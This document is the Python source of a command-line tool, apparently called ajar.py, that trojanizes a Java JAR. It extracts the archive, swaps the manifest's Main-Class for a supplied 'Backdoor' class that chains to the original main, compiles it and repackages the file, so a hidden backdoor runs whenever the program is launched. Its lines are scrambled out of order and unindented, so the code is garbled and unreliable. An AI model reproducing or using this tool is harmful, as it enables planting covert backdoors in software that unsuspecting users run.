import zipfile, os, subprocess, shutil, sys, getopt, re
backdoor = target = None
outfile = 'backdoor.jar'
def main(argv):...
help = 0
opts, args = getopt.getopt(argv, 'b:t:o:', ['backdoor=', 'target=', 'outfile=']
    )
print('USAGE:\tajar.py -b <backdoor.java> -t <target.jar> [-o <outfile.jar>]')
for opt, arg in opts:
sys.exit(2)
if opt == '-h':
if (backdoor != None) & (target != None):
help = 1
if opt in ('-b', '--backdoor'):
if help != 1:
start()
print('[!] An error ocurred:\n')
def createZip(src, dst):...
print('USAGE:\tajar.py')
backdoor = arg
if opt in ('-t', '--target'):
print('USAGE:\tajar.py -b <backdoor.java> -t <target.jar> [-o <outfile.jar>]')
for e in sys.exc_info():
zf = zipfile.ZipFile('%s' % dst, 'w')
target = arg
if opt in ('-o', '--outfile'):
print(e)
abs_src = os.path.abspath(src)
outfile = arg
for dirname, subdirs, files in os.walk(src):
for filename in files:
zf.close()
if filename != backdoor:
def start():...
absname = os.path.abspath(os.path.join(dirname, filename))
print('[*] Starting backdoor process')
arcname = absname[len(abs_src) + 1:]
print('[*] Decompressing target to tmp directory...')
zf.write(absname, arcname)
zip.extractall('tmp')
print('[*] Target dumped to tmp directory')
print('[*] Modifying manifest file...')
oldmain = ''
man = open('tmp/META-INF/MANIFEST.MF', 'r').read()
for l in man.split('\n'):
if 'Main-Class' in l:
print('[*] Manifest file modified')
oldmain = l[12:]
f.write('%s\n' % l)
print('[*] Modifying provided backdoor...')
f.write('Main-Class: %s\n' % 'Backdoor')
inmain = False
level = 0
bd = open(backdoor, 'r').read()
for l in bd.split('\n'):
if 'main(' in l:
print('[*] Provided backdoor successfully modified')
inmain = True
if '}' in l and level < 2 and inmain:
print('[*] Compiling modified backdoor...')
f.write(l)
f.write('%s.main(args);}' % oldmain)
if '}' in l and level > 1 and inmain:
if subprocess.call('javac -cp tmp/ tmp/%s' % backdoor, shell=True) != 0:
inmain = False
level -= 1
if '{' in l and inmain:
print('[!] Error compiling %s' % backdoor)
print('[*] Compiled modified backdoor')
f.write(l)
level += 1
f.write(l)
if len(oldmain) < 1:
f.write(l)
print('[!] Main-Class manifest attribute not found')
print('[*] Repackaging target jar file...')
shutil.rmtree('tmp/')
createZip('tmp', outfile)
if __name__ == '__main__':
print('[*] Target jar successfully repackaged')
main(sys.argv[1:])
